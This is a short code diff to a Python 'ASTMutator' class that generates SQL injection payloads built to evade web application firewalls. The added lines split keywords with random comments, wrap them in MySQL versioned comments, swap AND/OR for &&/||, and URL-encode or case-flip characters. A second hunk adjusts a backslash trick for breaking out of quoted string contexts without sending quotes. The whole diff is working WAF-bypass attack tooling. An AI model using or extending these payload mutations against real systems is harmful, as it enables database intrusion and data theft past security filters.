@@ -130,8 +130,9 @@ class ASTMutator:
             if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and (rep < 0.8 or random.random() < 0.3):
                 # Apply a bypass transformation
                 bypasses = [
-                    lambda k: f"{k[:len(k)//2]}/**/{k[len(k)//2:]}",
-                    lambda k: f"/*!{random.randint(40000, 60000)}{k}*/",
+                    lambda k: f"{k[:len(k)//2]}/*{random.randint(100, 9999)}*/{k[len(k)//2:]}",
+                    lambda k: f"/*!{random.randint(0, 99999)}{k}*/",
+                    lambda k: "&&" if k == "AND" else ("||" if k == "OR" else k),
                     lambda k: "".join([f"%{ord(c):02x}" if random.random() < 0.4 else c for c in k]),
                     lambda k: f"({k})" if k in ["SELECT", "UNION", "AND", "OR", "XOR"] else k,
                     lambda k: "".join([c.swapcase() if random.random() < 0.5 else c for c in k])
@@ -202,8 +203,9 @@ class ASTMutator:
             # We absolutely avoid sending ANY quotes.
             if self.context in ["SINGLE_QUOTE", "DOUBLE_QUOTE", "GENERIC"]:
                  # Relying on backslash escape trick to break out of string context implicitly
-                 escape_char = "\\" 
-                 return escape_char + payload + chosen_term
+                 # Fix: Avoid backslash explosion (don't stack if already present)
+                 prefix = "\\" if not payload.startswith("\\") else ""
+                 return prefix + payload + chosen_term
             return payload + chosen_term
 
         if self.context == "NUMERIC":
